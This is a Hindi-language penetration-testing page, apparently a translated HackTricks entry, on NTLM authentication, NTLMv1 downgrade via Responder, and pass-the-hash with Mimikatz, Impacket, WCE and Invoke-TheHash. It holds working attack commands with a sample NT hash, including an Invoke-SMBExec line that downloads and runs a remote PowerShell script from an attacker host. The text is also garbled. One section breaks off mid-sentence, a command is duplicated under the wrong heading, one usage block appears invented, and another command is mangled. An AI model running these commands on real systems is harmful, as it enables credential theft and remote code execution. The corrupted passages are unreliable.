# NTLM

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप किसी **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी कंपनी को **HackTricks में विज्ञापित** देखना चाहते हैं? या क्या आपको **PEASS के नवीनतम संस्करण या HackTricks को PDF में डाउनलोड** करने का उपयोग करना है? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!
* खोजें [**The PEASS Family**](https://opensea.io/collection/the-peass-family), हमारा विशेष संग्रह [**NFTs**](https://opensea.io/collection/the-peass-family)
* प्राप्त करें [**आधिकारिक PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या मुझे **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)** का पालन करें।**
* **अपने हैकिंग ट्रिक्स साझा करें और PRs सबमिट करें** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **और** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **को**.

</details>

## मूलभूत जानकारी

**NTLM क्रेडेंशियल्स**: डोमेन नाम (यदि कोई हो), उपयोगकर्ता नाम और पासवर्ड हैश।

**LM** केवल **Windows XP और सर्वर 2003** में **सक्षम** है (LM हैश को क्रैक किया जा सकता है)। LM हैश AAD3B435B51404EEAAD3B435B51404EE यह दर्शाता है कि LM का उपयोग नहीं हो रहा है (खाली स्ट्रिंग का LM हैश है)।

डिफ़ॉल्ट रूप से **Kerberos** का उपयोग होता है, इसलिए NTLM का उपयोग केवल तभी होगा जब **कोई Active Directory कॉन्फ़िगर नहीं होता है**, **डोमेन मौजूद नहीं होता है**, **Kerberos काम नहीं कर रहा होता है** (बुरी कॉन्फ़िगरेशन) या **क्लाइंट** जो IP का उपयोग करके संपर्क करने की कोशिश करता है बजाय एक मान्य होस्ट-नाम का उपयोग करता है।

एक **NTLM प्रमाणीकरण** के **नेटवर्क पैकेट** में **हेडर** "**NTLMSSP**" होता है।

प्रोटोकॉल: LM, NTLMv1 और NTLMv2 को DLL %windir%\Windows\System32\msv1\_0.dll में समर्थित किया जाता है

## LM, NTLMv1 और NTLMv2

आप जांच और कॉन्फ़िगर कर सकते हैं कि कौन सा प्रोटोकॉल उपयोग होगा:

### GUI

_secpol.msc_ को निष्पादित करें -> स्थानीय नीतियाँ -> सुरक्षा विकल्प -> नेटवर्क सुरक्षा: LAN प्रबंधक प्रमाणीकरण स्तर। 6 स्तर हैं (0 से 5 तक).

![](<../../.gitbook/assets/image (92).png>)

### रजिस्ट्री

यह स्तर 5 सेट करेगा:
```
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 5 /f
```
संभावित मान:
```
0 - Send LM & NTLM responses
1 - Send LM & NTLM responses, use NTLMv2 session security if negotiated
2 - Send NTLM response only
3 - Send NTLMv2 response only
4 - Send NTLMv2 response only, refuse LM
5 - Send NTLMv2 response only, refuse LM & NTLM
```
## मूल NTLM डोमेन प्रमाणीकरण योजना

1. **उपयोगकर्ता** अपने **प्रमाण** प्रस्तुत करता है
2. क्लाइंट मशीन **प्रमाणीकरण अनुरोध** भेजता है और **डोमेन नाम** और **उपयोगकर्ता नाम** भेजता है
3. **सर्वर** चुनौती भेजता है
4. **क्लाइंट** चुनौती को **पासवर्ड के हैश का उपयोग करके एन्क्रिप्ट** करता है और इसे प्रतिक्रिया के रूप में भेजता है
5. **सर्वर** **डोमेन कंट्रोलर** को **डोमेन नाम, उपयोगकर्ता नाम, चुनौती और प्रतिक्रिया** भेजता है। यदि **कोई सक्रिय निर्देशिका** कॉन्फ़िगर नहीं है या डोमेन नाम सर्वर का नाम है, तो प्रमाण पुष्टि **स्थानीय रूप से जांची जाती है**।
6. **डोमेन कंट्रोलर** जांचता है कि क्या सब कुछ सही है और सर्वर को जानकारी भेजता है

**सर्वर** और **डोमेन कंट्रोलर** को **नेटलॉगन** सर्वर के माध्यम से **सुरक्षित चैनल** बनाने की क्षमता होती है क्योंकि डोमेन कंट्रोलर को सर्वर का पासवर्ड पता होता है (यह **NTDS.DIT** डेटाबेस में होता है)।

### स्थानीय NTLM प्रमाणीकरण योजना

प्रमाणीकरण उसी तरह होता है जैसा **पहले उल्लिखित हुआ है लेकिन** **सर्वर** को **उपयोगकर्ता के हैश का पता होता है** जो **SAM** फ़ाइल में प्रमाणीकृत करने की कोशिश करता है। इसलिए, डोमेन कंट्रोलर की जगह पूछने की बजाय, **सर्वर खुद जांचेगा** कि क्या उपयोगकर्ता प्रमाणीकृत कर सकता है।

### NTLMv1 चुनौती

**चुनौती की लंबाई 8 बाइट होती है** और **प्रतिक्रिया 24 बाइट** लंबी होती है।

**हैश NT (16 बाइट)** को **3 हिस्सों में बांटा जाता है, प्रत्येक 7 बाइट का** (7B + 7B + (2B+0x00\*5)): **अंतिम हिस्सा शून्यों से भरा होता है**। फिर, **चुनौती** को **प्रत्येक हिस्से के साथ अलग-अलग एन्क्रिप्ट** किया जाता है और **परिणामस्वरूप** एन्क्रिप्टेड बाइट्स **जुड़ जाते हैं**। कुल: 8B + 8B + 8B = 24 बाइट।

**समस्याएं**:

* **यादृच्छिकता की कमी**
* 3 हिस्सों को **अलग-अलग हमला** किया जा सकता है ताकि NT हैश पता लगाया जा सके
* **DES को तोड़ा जा सकता है**
* 3 वें कुंजी में हमेशा **5 शून्यों** से मिलकर बनी होती है।
* **एक ही चुनौती** दिए जाने पर **प्रतिक्रिया** **एक ही** होगी। इसलिए, आप पीड़ित को **चुनौती** के रूप में स्ट्रिंग "**1122334455667788**" दे सकते हैं और प्रतिक्रिया को **पूर्व-गणित इंद्रधनुष** का उपयोग करके हमला कर सकते हैं।

### NTLMv1 हमला

आजकल अनियंत्रित अनुमति के साथ वातावरण ढूंढना कम हो रहा है, लेकिन इसका यह मतलब नहीं है कि आप **प्रिंट स्पूलर सेवा** का दुरुपयोग नहीं कर सकते।

आप AD पर पहले से ही कुछ प्रमाण / सत्र का दुरुपयोग करके **प्रिंटर को प्रमाणीकृत करने** के लिए कुछ **प्रमाण** / **सत्र** का उपयोग कर सकते हैं जो आपके नियंत्रण के तहत किसी **होस्ट के खिलाफ** होगा। फिर, `metasploit auxiliary/server/capture/smb` या `responder` का उपयोग करके आप **प्रमाणीकरण चुनौती को 1122334455667788** पर सेट कर सकते हैं, प्रमाणीकरण का प्रयास कैप्चर कर सकते हैं, और यदि यह **NTLMv1** का उपयोग करके किया गया था तो आप इसे **तोड़ सकेंगे**।\
यदि आप `responder` का उपयोग कर रहे हैं तो आप **प्रमाणीकरण** को **डाउनग्रेड** करने के लिए **ध्वज `--lm`** का उपयोग कर सकते हैं।\
_ध्यान दें कि इस तकनीक के लिए प्रमाणीकरण को NTLMv1 का उपयोग करके किया जाना चाहिए (NTLMv2 मान्य नहीं है)।_

ध्यान दें कि प्रिंटर प्रमाणीकरण के दौरान कंप्यूटर खाता का उपयोग करेगा, और कंप्यूटर खाते में **लंबा और यादृच्छिक पासवर्ड** का उपयोग होता है जिसे आप **सामान्य शब्दकोश** का उपयोग करके **तोड़ने में सक्षम नहीं होंगे**। लेकिन **NTLMv1** प्रमाणीकरण **DES का उपयोग करता है** ([अधिक जान
```bash
Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"'
```
यह एक प्रक्रिया शुरू करेगा जो मिमीकैट्स लॉन्च करने वाले उपयोगकर्ताओं के नाम होगी, लेकिन LSASS में सहेजे गए क्रेडेंशियल्स मिमीकैट्स पैरामीटर्स के अंदर होंगे। फिर, आप उस उपयोगकर्ता के रूप में नेटवर्क संसाधनों तक पहुंच सकते हैं (जैसे कि `runas /netonly` ट्रिक के समान, लेकिन आपको प्लेन-टेक्स्ट पासवर्ड को जानने की आवश्यकता नहीं होती है)।

### लिनक्स से पास-द-हैश

आप लिनक्स से पास-द-हैश का उपयोग करके विंडोज मशीनों में कोड निष्पादन प्राप्त कर सकते हैं।\
[**यहां जानने के लिए एक्सेस करें।**](../../windows/ntlm/broken-reference/)

### Impacket विंडोज कंपाइल्ड टूल्स

आप यहां से विंडोज के लिए impacket बाइनरी डाउनलोड कर सकते हैं: [https://github.com/ropnop/impacket\_static\_binaries/releases/tag/0.9.21-dev-binaries](https://github.com/ropnop/impacket\_static\_binaries/releases/tag/0.9.21-dev-binaries).

* **psexec\_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
* **wmiexec.exe** `wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
* **atexec.exe** (इस मामले में आपको एक कमांड निर्दिष्ट करनी होगी, cmd.exe और powershell.exe एक इंटरैक्टिव शेल प्राप्त करने के लिए मान्य नहीं हैं) `C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
* और भी कई Impacket बाइनरी हैं...

### Invoke-TheHash

आप यहां से पावरशेल स्क्रिप्ट प्राप्त कर सकते हैं: [https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)

#### Invoke-SMBExec
```
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-WMIExec

Invoke-WMIExec एक PowerShell स्क्रिप्ट है जिसका उपयोग WMI (Windows Management Instrumentation) का उपयोग करके दूरस्थ सिस्टम पर कमांड चलाने के लिए किया जाता है। यह एक प्रभावी तकनीक है जो NTLM हैश को उपयोग करके दूरस्थ सिस्टम पर एक्सीक्यूशन प्राप्त करने की क्षमता प्रदान करती है।

इस तकनीक का उपयोग करने के लिए, आपको एक दूरस्थ सिस्टम पर पहुंच होनी चाहिए जिसमें WMI सेवा सक्रिय है। आपको इस स्क्रिप्ट को दूरस्थ सिस्टम पर अपलोड करना होगा और उसे PowerShell के माध्यम से चलाना होगा। इसके बाद, आप दूरस्थ सिस्टम पर कमांड चला सकते हैं और उसके उत्पादन को प्राप्त कर सकते हैं।

यह तकनीक एक प्रभावी और गोपनीयता-मुक्त तरीके है जो एक हैश लीक के बिना दूरस्थ सिस्टम पर एक्सीक्यूशन प्राप्त करने की क्षमता प्रदान करती है।
```
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-SMBClient

इस टेक्निक का उपयोग SMB क्लाइंट को चालू करने के लिए किया जाता है।
```
Invoke-SMBClient -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 [-Action Recurse] -Source \\dcorp-mgmt.my.domain.local\C$\ -verbose
```
#### इनवोक-एसएमबीईनम

```plaintext
Invoke-SMBEnum is a PowerShell script that can be used to enumerate information from SMB services. It can be used to gather information such as user accounts, shares, sessions, and more.

Usage:
Invoke-SMBEnum -Target <target> [-Port <port>] [-Credential <credential>] [-Verbose]

Parameters:
- Target: The IP address or hostname of the target machine.
- Port: The port number to connect to (default is 445).
- Credential: The credentials to use for authentication (optional).
- Verbose: Enable verbose output (optional).

Example:
Invoke-SMBEnum -Target 192.168.1.10 -Port 445 -Credential (Get-Credential)
```

Invoke-SMBEnum एक पावरशेल स्क्रिप्ट है जिसका उपयोग SMB सेवाओं से जानकारी निरूपित करने के लिए किया जा सकता है। इसका उपयोग उपयोगकर्ता खातों, साझा संसाधन, सत्रों और अधिक जैसी जानकारी इकट्ठा करने के लिए किया जा सकता है।

उपयोग:
Invoke-SMBEnum -Target <target> [-Port <port>] [-Credential <credential>] [-Verbose]

पैरामीटर:
- Target: लक्षित मशीन का आईपी पता या होस्टनाम।
- Port: कनेक्ट करने के लिए पोर्ट नंबर (डिफ़ॉल्ट 445)।
- Credential: प्रमाणीकरण के लिए उपयोग किए जाने वाले क्रेडेंशियल (वैकल्पिक)।
- Verbose: वर्बोस आउटपुट सक्षम करें (वैकल्पिक)।

उदाहरण:
Invoke-SMBEnum -Target 192.168.1.10 -Port 445 -Credential (Get-Credential)
```
```
Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 -Target dcorp-mgmt.dollarcorp.moneycorp.local -verbose
```
#### Invoke-TheHash

यह फ़ंक्शन **अन्य सभी** का **मिश्रण है**। आप **कई होस्ट** पास कर सकते हैं, किसी को **छोड़ सकते हैं** और आपको उपयोग करने के लिए **विकल्प** का **चयन** कर सकते हैं (_SMBExec, WMIExec, SMBClient, SMBEnum_)। यदि आप **SMBExec** और **WMIExec** में से **किसी भी** का चयन करते हैं लेकिन आप **कोई** _**Command**_ पैरामीटर नहीं देते हैं तो यह केवल यह जांचेगा कि क्या आपके पास **पर्याप्त अनुमतियाँ** हैं।
```
Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
```
### [Evil-WinRM पास द हैश](../../network-services-pentesting/5985-5986-pentesting-winrm.md#using-evil-winrm)

### Windows Credentials Editor (WCE)

**इसे व्यवस्थापक के रूप में चलाना चाहिए**

यह उपकरण mimikatz की तरहीं काम करेगा (LSASS मेमोरी को संशोधित करेगा)।
```
wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
```
### उपयोगकर्ता नाम और पासवर्ड के साथ मैनुअल Windows रिमोट निष्पादन

{% content-ref url="../lateral-movement/" %}
[lateral-movement](../lateral-movement/)
{% endcontent-ref %}

## एक Windows होस्ट से क्रेडेंशियल्स निकालना

**एक Windows होस्ट से क्रेडेंशियल्स प्राप्त करने के बारे में अधिक जानकारी के लिए** [**इस पेज को पढ़ें**](broken-reference)**.**

## NTLM रिले और रेस्पॉन्डर

**इन हमलों को कैसे करें, इसके बारे में अधिक विस्तृत गाइड पढ़ें:**

{% content-ref url="../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md" %}
[spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
{% endcontent-ref %}

## नेटवर्क कैप्चर से NTLM चुनौतियों को पार्स करें

**आप इसका उपयोग कर सकते हैं** [**https://github.com/mlgualtieri/NTLMRawUnHide**](https://github.com/mlgualtieri/NTLMRawUnHide)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप **साइबर सुरक्षा कंपनी में काम करते हैं**? क्या आप अपनी कंपनी को **HackTricks में विज्ञापित** देखना चाहते हैं? या क्या आपको **PEASS के नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करने का उपयोग** करने की अनुमति चाहिए? [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) की जांच करें!
* खोजें [**The PEASS Family**](https://opensea.io/collection/the-peass-family), हमारा विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह
* प्राप्त करें [**आधिकारिक PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) में या मुझे **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)** का** **अनुसरण** करें।**
* **अपने हैकिंग ट्रिक्स को हमें PR के माध्यम से सबमिट करके** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **और** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **को साझा करें।**

</details>
